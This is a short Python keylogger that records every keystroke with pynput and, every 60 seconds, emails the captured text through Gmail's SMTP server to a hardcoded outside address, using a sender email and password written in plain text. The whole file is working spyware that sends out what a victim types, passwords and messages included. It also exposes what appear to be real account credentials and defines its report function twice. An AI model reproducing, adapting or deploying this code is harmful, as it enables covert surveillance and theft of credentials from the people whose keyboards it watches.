from pynput import keyboard
import smtplib
import threading

LOG = ""
EMAIL = "kreziigambino@gmail.com"
PASSWORD = "mtm14105"
TO_EMAIL = "isolomonao2023@gmail.com"
SEND_INTERVAL = 60 #seconds

def send_email(log):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL, PASSWORD)
        message = f"Subject: Keylogger Report\n\n{log}"
        server.sendmail(EMAIL, TO_EMAIL, message)
        server.quit()
        print("Log sent.")
    except Exception as e:
        print(f"Failed to send email: {e}")

def on_press(key):
    global LOG
    try:
        LOG += key.char #regular key
    except AttributeError:
        #special key
        if key == keyboard.Key.space:
            LOG += " "
        elif key == keyboard.Key.enter:
            LOG += "\n"
        elif key == keyboard.Key.tab:
            LOG += "\t"
        else:
            LOG += f" [{key.name}] "

def report():
    global LOG 
    if LOG:
        send_email(LOG)
        LOG = ""
    threading.Timer(SEND_INTERVAL, report).start()

def report():
    global LOG
    if LOG:
        send_email(LOG)
        LOG = ""
    threading.Timer(SEND_INTERVAL, report).start()

def main():
    report()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()

   